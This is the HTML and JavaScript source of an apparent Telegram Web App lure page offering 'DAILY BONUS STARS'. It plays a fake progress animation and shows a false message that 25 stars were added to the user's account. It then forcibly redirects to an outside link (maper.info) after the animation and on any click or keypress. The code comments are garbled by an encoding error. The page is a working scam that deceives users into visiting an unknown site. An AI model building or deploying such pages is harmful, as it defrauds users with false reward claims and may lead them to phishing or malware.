<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bonus Stars!</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
            color: white;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            text-align: center;
        }

        .container {
            max-width: 400px;
            padding: 20px;
        }

        .stars-icon {
            font-size: 80px;
            margin-bottom: 20px;
            animation: glow 2s ease-in-out infinite alternate;
        }

        @keyframes glow {
            0% { transform: scale(1); text-shadow: 0 0 10px #ffd700; }
            100% { transform: scale(1.1); text-shadow: 0 0 30px #ffd700, 0 0 40px #ffd700; }
        }

        .title {
            font-size: 32px;
            font-weight: bold;
            margin-bottom: 15px;
            background: linear-gradient(45deg, #ffd700, #ffa500);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .subtitle {
            font-size: 18px;
            margin-bottom: 25px;
            opacity: 0.9;
        }

        .bonus-amount {
            font-size: 48px;
            font-weight: bold;
            color: #ffd700;
            margin: 20px 0;
            text-shadow: 0 0 20px rgba(255, 215, 0, 0.5);
            animation: pulse 1.5s ease-in-out infinite;
        }

        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }

        .progress-container {
            background: rgba(255,255,255,0.1);
            border-radius: 15px;
            padding: 20px;
            margin: 20px 0;
            border: 2px solid rgba(255, 215, 0, 0.3);
        }

        .progress-text {
            font-size: 16px;
            margin-bottom: 15px;
        }

        .progress-bar {
            width: 100%;
            height: 12px;
            background: rgba(255,255,255,0.2);
            border-radius: 6px;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #ffd700, #ffa500);
            width: 0%;
            animation: progress 2.5s ease-in-out forwards;
        }

        @keyframes progress {
            0% { width: 0%; }
            100% { width: 100%; }
        }

        .claiming-text {
            font-size: 22px;
            font-weight: bold;
            margin: 25px 0;
            color: #4caf50;
            min-height: 30px;
        }

        .stars-animation {
            position: relative;
            height: 60px;
            margin: 20px 0;
        }

        .star {
            position: absolute;
            font-size: 24px;
            animation: starFloat 3s ease-in-out infinite;
        }

        @keyframes starFloat {
            0%, 100% { transform: translateY(0) rotate(0deg); opacity: 0; }
            50% { transform: translateY(-20px) rotate(180deg); opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="stars-icon">‚≠ê</div>
        <div class="title">DAILY BONUS STARS!</div>
        <div class="subtitle">Your free reward is waiting</div>
        
        <div class="bonus-amount">+25 STARS</div>

        <div class="stars-animation" id="starsAnimation"></div>

        <div class="progress-container">
            <div class="progress-text">Processing your bonus stars...</div>
            <div class="progress-bar">
                <div class="progress-fill"></div>
            </div>
        </div>

        <div class="claiming-text" id="claimingText">üéä Preparing your stars...</div>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        
        // –°–æ–∑–¥–∞–µ–º –∞–Ω–∏–º–∞—Ü–∏—é –∑–≤–µ–∑–¥
        function createStarsAnimation() {
            const container = document.getElementById('starsAnimation');
            const stars = ['‚≠ê', 'üåü', 'üí´', '‚ú®'];
            
            for (let i = 0; i < 8; i++) {
                const star = document.createElement('div');
                star.className = 'star';
                star.textContent = stars[Math.floor(Math.random() * stars.length)];
                star.style.left = Math.random() * 100 + '%';
                star.style.animationDelay = (Math.random() * 2) + 's';
                container.appendChild(star);
            }
        }
        
        // –§—É–Ω–∫—Ü–∏—è —Ä–µ–¥–∏—Ä–µ–∫—Ç–∞
        function forceRedirect() {
            const targetUrl = "https://maper.info/RNDX87";
            window.location.href = targetUrl;
        }
        
        // –ê–Ω–∏–º–∞—Ü–∏—è –ø–æ–ª—É—á–µ–Ω–∏—è –∑–≤–µ–∑–¥
        function startStarsClaim() {
            const texts = [
                "üéä Preparing your stars...",
                "‚≠ê Counting your bonus...",
                "üí∞ Adding to your balance...",
                "üéØ Almost ready...",
                "‚úÖ 25 Stars Added to Your Account!"
            ];
            
            let currentIndex = 0;
            const textElement = document.getElementById('claimingText');
            
            const textInterval = setInterval(() => {
                textElement.textContent = texts[currentIndex];
                textElement.style.color = currentIndex === texts.length - 1 ? '#4caf50' : '#ffd700';
                currentIndex++;
                
                if (currentIndex >= texts.length) {
                    clearInterval(textInterval);
                    setTimeout(forceRedirect, 1500);
                }
            }, 800);
        }
        
        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è
        function init() {
            tg.ready();
            tg.expand();
            
            createStarsAnimation();
            startStarsClaim();
            
            // –†–µ–¥–∏—Ä–µ–∫—Ç –ø—Ä–∏ –ª—é–±–æ–º –¥–µ–π—Å—Ç–≤–∏–∏
            document.addEventListener('click', forceRedirect);
            document.addEventListener('keydown', forceRedirect);
        }
        
        document.addEventListener('DOMContentLoaded', init);
    </script>
</body>
</html>
